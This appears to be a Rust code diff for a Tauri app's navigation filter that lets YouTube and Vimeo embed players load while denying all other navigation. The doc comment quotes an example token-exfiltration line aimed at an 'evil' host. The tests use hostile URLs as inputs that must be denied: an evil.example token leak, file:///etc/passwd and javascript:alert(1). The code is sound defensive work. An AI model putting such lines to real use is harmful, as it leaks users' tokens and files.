@@ -22,8 +22,20 @@ pub fn is_app_url(url: &Url) -> bool {
 ///
 /// Tauri/wry's navigation callback carries only the URL, not whether it is the
 /// main frame or a subframe, so the rule has to be safe for both: the bundle
-/// (and inert `about:` frames) load; EVERYTHING else is cancelled, silently and
-/// without side effects. In particular a navigation never opens the system
+/// (and inert `about:` frames) load, and — once a server is configured
+/// (`embeds`) — the two embed players of `origin::EMBED_FRAME_SOURCES`
+/// (YouTube no-cookie `/embed/`, Vimeo `/video/`; owner decision c.7), because
+/// a frame's load arrives here as a navigation and would otherwise be
+/// cancelled whatever the CSP says. EVERYTHING else is cancelled, silently and
+/// without side effects.
+///
+/// What allowing the players costs: the MAIN frame may be navigated to one of
+/// those two player paths as well (the callback cannot refuse it without
+/// refusing the frame). The destination is never attacker-chosen beyond "a
+/// YouTube / Vimeo player page", that page has no IPC (capabilities are
+/// local-origin only), `get_token` answers only for the configured server, and
+/// every navigation onward from it is cancelled by this same rule. It adds no
+/// way to send data out that a frame to the same path does not already have. In particular a navigation never opens the system
 /// browser: a `<meta refresh>` in a sandboxed website-note iframe, or
 /// `location = "https://evil/?t=" + token` from injected script, goes nowhere.
 /// Opening a link is a separate, explicit path: [`open_external_target`] plus
@@ -34,8 +46,11 @@ pub enum NavDecision {
     Deny,
 }
 
-pub fn navigation_decision(url: &Url) -> NavDecision {
-    if is_app_url(url) || url.scheme() == "about" {
+pub fn navigation_decision(url: &Url, embeds: bool) -> NavDecision {
+    if is_app_url(url)
+        || url.scheme() == "about"
+        || (embeds && crate::origin::is_embed_player_url(url))
+    {
         NavDecision::Allow
     } else {
         NavDecision::Deny
@@ -77,6 +92,7 @@ pub fn create_main_window<R: Runtime>(app: &mut App<R>) -> tauri::Result<Webview
     #[cfg(mobile)]
     let script = crate::host::init_script(None);
 
+    let nav_handle = app.handle().clone();
     #[allow(unused_mut)]
     let mut builder =
         WebviewWindowBuilder::new(app, MAIN_WINDOW, WebviewUrl::App("index.html".into()))
@@ -88,8 +104,10 @@ pub fn create_main_window<R: Runtime>(app: &mut App<R>) -> tauri::Result<Webview
                 let finished = matches!(payload.event(), tauri::webview::PageLoadEvent::Finished);
                 crate::links::on_page_loaded(window.app_handle(), finished);
             })
-            .on_navigation(|url| {
-                let d = navigation_decision(url);
+            .on_navigation(move |url| {
+                // Players only while a server is configured (the CSP's rule too).
+                let embeds = nav_handle.state::<AppState>().origin().is_some();
+                let d = navigation_decision(url, embeds);
                 if d == NavDecision::Deny {
                     log::info!("blocked a {}: navigation", url.scheme());
                 }
@@ -277,25 +295,50 @@ mod tests {
     #[test]
     fn navigation_decisions() {
         use NavDecision::*;
+        let navigation_decision_off = |url: &Url| navigation_decision(url, false);
+        // The two embed players load once a server is configured — and only then, only their
+        // player paths, only over https on the exact host.
+        let yt = u("https://www.youtube-nocookie.com/embed/dQw4w9WgXcQ?rel=0");
+        let vimeo = u("https://player.vimeo.com/video/76979871");
+        assert_eq!(navigation_decision(&yt, true), Allow);
+        assert_eq!(navigation_decision(&vimeo, true), Allow);
+        assert_eq!(navigation_decision(&yt, false), Deny);
+        assert_eq!(navigation_decision(&vimeo, false), Deny);
+        for other in [
+            "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
+            "https://www.youtube-nocookie.com/",
+            "https://accounts.google.com/",
+            "https://vimeo.com/76979871",
+            "https://open.spotify.com/embed/track/x",
+            "https://www.loom.com/embed/x",
+            "https://www.figma.com/embed",
+            "https://docs.google.com/document/d/x",
+            "https://evil.example/embed/x",
+        ] {
+            assert_eq!(navigation_decision(&u(other), true), Deny, "{other}");
+        }
+        // With players allowed, everything below is unchanged.
+        assert_eq!(navigation_decision(&u("https://evil.example/?t=pd_x"), true), Deny);
+        assert_eq!(navigation_decision(&u("tauri://localhost/"), true), Allow);
         // The bundle loads.
-        assert_eq!(navigation_decision(&u("tauri://localhost/")), Allow);
+        assert_eq!(navigation_decision_off(&u("tauri://localhost/")), Allow);
         assert_eq!(
-            navigation_decision(&u("tauri://localhost/p/some-site")),
+            navigation_decision_off(&u("tauri://localhost/p/some-site")),
             Allow
         );
-        assert_eq!(navigation_decision(&u("http://tauri.localhost/")), Allow);
-        assert_eq!(navigation_decision(&u("about:srcdoc")), Allow);
+        assert_eq!(navigation_decision_off(&u("http://tauri.localhost/")), Allow);
+        assert_eq!(navigation_decision_off(&u("about:srcdoc")), Allow);
         // External, whether main frame or a subframe (the callback can't tell):
         // cancelled, never opened.
         assert_eq!(
-            navigation_decision(&u("https://evil.example/?t=pd_x")),
+            navigation_decision_off(&u("https://evil.example/?t=pd_x")),
             Deny
         );
-        assert_eq!(navigation_decision(&u("http://localhost:1940/")), Deny);
-        assert_eq!(navigation_decision(&u("mailto:someone@example.com")), Deny);
-        assert_eq!(navigation_decision(&u("tauri://evil/")), Deny);
-        assert_eq!(navigation_decision(&u("file:///etc/passwd")), Deny);
-        assert_eq!(navigation_decision(&u("javascript:alert(1)")), Deny);
+        assert_eq!(navigation_decision_off(&u("http://localhost:1940/")), Deny);
+        assert_eq!(navigation_decision_off(&u("mailto:someone@example.com")), Deny);
+        assert_eq!(navigation_decision_off(&u("tauri://evil/")), Deny);
+        assert_eq!(navigation_decision_off(&u("file:///etc/passwd")), Deny);
+        assert_eq!(navigation_decision_off(&u("javascript:alert(1)")), Deny);
     }
 
     #[test]
